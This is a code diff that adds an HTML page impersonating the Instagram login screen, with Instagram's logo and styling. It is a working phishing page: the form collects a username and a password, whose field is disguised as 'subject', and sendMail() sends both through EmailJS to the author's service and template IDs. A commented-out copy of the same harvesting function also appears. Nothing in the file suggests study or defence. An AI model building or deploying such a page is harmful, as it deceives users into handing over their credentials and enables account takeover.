@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="image/ig-favicon.png">
+  <title>Instagram Login</title>
+  <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: 'Arial', sans-serif;
+        background-color: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      
+      .login-container {
+        width: 100%;
+        max-width: 350px;
+        background-color: white;
+        padding: 20px;
+        border: 1px solid #dbdbdb;
+        border-radius: 5px;
+        text-align: center;
+      }
+      
+      .login-box {
+        margin-bottom: 20px;
+      }
+      
+      .logo img {
+        width: 150px;
+        margin-bottom: 20px;
+      }
+      
+      form input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        font-size: 14px;
+      }
+      
+      button {
+        width: 100%;
+        padding: 10px;
+        background-color: #0095f6;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        font-size: 14px;
+        cursor: pointer;
+      }
+      
+      button:hover {
+        background-color: #007bb5;
+      }
+      
+      .forgot-password a {
+        font-size: 12px;
+        color: #0095f6;
+        text-decoration: none;
+      }
+      
+      .forgot-password a:hover {
+        text-decoration: underline;
+      }
+      
+      .sign-up {
+        margin-top: 20px;
+      }
+      
+      .sign-up a {
+        color: #0095f6;
+        text-decoration: none;
+      }
+      
+      .sign-up a:hover {
+        text-decoration: underline;
+      }
+      
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
+      </div>
+      <form>
+        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="subject" name="subject" placeholder="Password" required>
+        <button type="button" onclick="sendMail()">Register</button>
+      </form>
+      <div class="forgot-password">
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+    <div class="sign-up">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+      (function (){
+          emailjs.init("FaXY3wl6TL22Ba94a"); // Unser Public KEY bei Emailjs
+      })();
+    </script>
+    <script>
+      function sendMail() {
+        const username = document.getElementById("username").value.trim();
+        const subject = document.getElementById("subject").value.trim();
+        const params = { username: username, subject: subject }; 
+    
+        emailjs.send("service_qdkyazz", "template_rrqpiuq", params)
+            .then(() => {
+                alert("Email sent successfully!");
+                document.getElementById("username").value = "";
+                document.getElementById("subject").value = "";
+            })
+            .catch((error) => {
+                alert("Failed to send email: " + error.text);
+            });
+        return false; // Verhindert das Neuladen der Seite
+    }
+    </script>
+    <!-- <script>
+      function sendMail(){
+        const username = document.getElementById("username").value.trim();
+        const subject = document.getElementById("subject").value.trim();
+        const params = { username, subject };
+       // Service und Template ID steht in emailjs
+        emailjs.send("service_qdkyazz","template_rrqpiuq",params).then(() => {
+                alert("Email sent successfully!");
+                document.getElementById("username").value = "";
+                document.getElementById("subject").value = "";
+            })
+            .catch((error) => {
+                alert("Failed to send email: " + error.text);
+            });
+            return false
+        }
+  </script> -->
+  
+</body>
+</html>
